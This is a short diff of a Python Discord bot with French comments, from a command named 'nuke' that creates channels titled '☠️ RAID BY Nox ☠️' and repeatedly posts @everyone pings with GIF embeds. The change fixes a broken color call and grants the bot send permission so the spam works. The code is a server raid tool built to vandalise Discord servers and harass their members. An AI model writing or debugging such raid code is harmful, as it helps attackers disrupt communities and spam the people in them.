@@ -55,8 +55,11 @@ async def nuke(ctx):
                 channel = await guild.create_text_channel("☠️ RAID BY Nox ☠️")
                 print(f"Salon créé : {channel.name}")
 
+                # S'assurer que le bot a la permission d'envoyer des messages dans le salon
+                await channel.set_permissions(guild.me, send_messages=True)
+
                 # Choisir un GIF au hasard dans la liste
-                embed = discord.Embed(description="☠️ RAID BY Nox ☠️\@everyone", color=discord.Color.raid())
+                embed = discord.Embed(description="☠️ RAID BY Nox ☠️\n@everyone", color=discord.Color.red())
                 embed.set_image(url=gifs[_ % len(gifs)])  # Sélectionner un GIF en fonction de l'index
                 
                 for _ in range(5):
